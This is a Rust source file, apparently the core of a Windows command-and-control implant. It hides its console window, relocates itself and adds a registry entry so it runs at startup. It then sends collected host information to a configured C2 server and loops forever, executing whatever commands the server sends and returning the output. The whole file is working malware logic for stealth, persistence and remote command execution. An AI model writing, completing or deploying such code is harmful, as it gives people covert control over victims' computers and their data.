pub mod actions;
pub mod agent;
pub mod config;
pub mod utils;
pub mod sockets;

use actions::command::Command;
use agent::info::Info;
use sockets::ServerStream;
use std::error::Error;

pub fn setup() {
    // hide process' console window
    utils::process::hide_console_window();
    // make sure the agent is running in the correct path
    if !utils::filesystem::check_desired_dir() {
        utils::filesystem::move_to_desired_dir();
    }
    // use windows registry to set the agent to run at startup
    utils::registry::add_to_startup();
}

pub fn run() -> Result<(), Box<dyn Error>> {
    // gathering host system's initial information
    let agent_info = Info::collect();
    let agent_info = agent_info.as_string();

    // create a session with C2 server and send initial data
    let mut server_stream = ServerStream::new(config::server::IP, config::server::PORT)?;
    server_stream.send(agent_info)?;

    // starting the main C&C loop
    loop {
        // get a command from the server
        let (input_command, command_size) = server_stream.receive()?;

        // parsing command to a string
        let input_command = input_command.get(..command_size).unwrap();
        let input_command = String::from_utf8(input_command.to_vec())?;

        // build the command object and execute it
        let command = Command::from_server(input_command);
        let result = command.execute()?;

        // send result back to the server
        server_stream.send(result)?;
    }
}
